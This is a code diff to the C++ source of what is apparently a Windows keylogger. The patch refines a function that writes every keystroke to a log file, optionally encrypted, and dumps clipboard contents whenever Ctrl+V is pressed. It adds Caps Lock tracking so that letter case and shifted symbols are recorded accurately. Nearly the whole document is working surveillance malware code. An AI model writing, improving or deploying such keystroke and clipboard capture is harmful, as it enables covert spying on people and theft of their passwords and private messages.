@@ -6,6 +6,8 @@
 std::set<DWORD> getAllThreadIds();
 template <class InputIterator> HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);
 FILE* OUTPUT_FILE;
+bool Caps = false;
+
 
 std::string Log::EncryptMyString(std::string UnencryptedString) {
     if (CryptLogs) {
@@ -65,6 +67,7 @@ void Log::LogItInt(int key_stroke) {
         break;
     case  VK_CAPITAL:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
+        Caps = !Caps;
         break;
     case -95:
     case -96:
@@ -75,12 +78,12 @@ void Log::LogItInt(int key_stroke) {
     case VK_RCONTROL:
     case VK_LCONTROL:
     case VK_CONTROL:
-        if ((GetKeyState(0x56) & 0x8000) != 0) {
+        if (GetKeyState((int)'V') & 0x8000) {
             fprintf(OUTPUT_FILE, "%s", EncryptMyString("[PASTE]"));
             fprintf(OUTPUT_FILE, "%s", EncryptMyString(GetClipBoardTxt()));
             break;
         }
-        if ((GetKeyState((int)'C') & 0x8000) != 0) {
+        if (GetKeyState((int)'C') & 0x8000) {
             fprintf(OUTPUT_FILE, "%s", EncryptMyString("[COPY]"));
             break;
         }
@@ -132,64 +135,65 @@ void Log::LogItInt(int key_stroke) {
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
         break;
     default:
-        if ((GetKeyState(VK_SHIFT) & 0x8000 && (GetKeyState(VK_CAPITAL) & 0x0001) != 0) || (GetKeyState(VK_SHIFT) & 0x8000 && (GetKeyState(VK_CAPITAL) & 0x0001) == 0)) {
+        if ((GetKeyState(VK_SHIFT) < 0) == Caps) {
+            if(key_stroke >= 'A' && key_stroke <= 'Z')
+                key_stroke += 32;
+        }else{
             switch (key_stroke) {
             case 48:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString(")"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString(")"));
                 goto fclose;
             case 49:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("!"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("!"));
                 goto fclose;
             case 50:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("@"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("@"));
                 goto fclose;
             case 51:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("#"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("#"));
                 goto fclose;
             case 52:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("$"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("$"));
                 goto fclose;
             case 53:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("%"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("%"));
                 goto fclose;
             case 54:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("^"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("^"));
                 goto fclose;
             case 55:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("&"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("&"));
                 goto fclose;
             case 56:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("*"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("*"));
                 goto fclose;
             case 57:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("("));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("("));
                 goto fclose;
             case -64:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("~"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("~"));
                 goto fclose;
             case -67:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("_"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("_"));
                 goto fclose;
             case -69:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("+"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("+"));
                 goto fclose;
             case -70:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString(":"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString(":"));
                 goto fclose;
             case -34:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("\""));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("\""));
                 goto fclose;
             case -68:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("<"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("<"));
                 goto fclose;
             case -66:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString(">"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString(">"));
                 goto fclose;
             case -65:
-                fprintf(OUTPUT_FILE,"%s", EncryptMyString("?"));
+                fprintf(OUTPUT_FILE, "%s", EncryptMyString("?"));
                 goto fclose;
-            default:
-                key_stroke += 32;
             }
         }
         if (CryptLogs) {
@@ -198,7 +202,7 @@ void Log::LogItInt(int key_stroke) {
             fprintf(OUTPUT_FILE, "%s", EncryptMyString(Temp));
         }
         else
-            fprintf(OUTPUT_FILE, "%s", &key_stroke);
+            fprintf(OUTPUT_FILE, "%s", &key_stroke );
         break;
         
     }
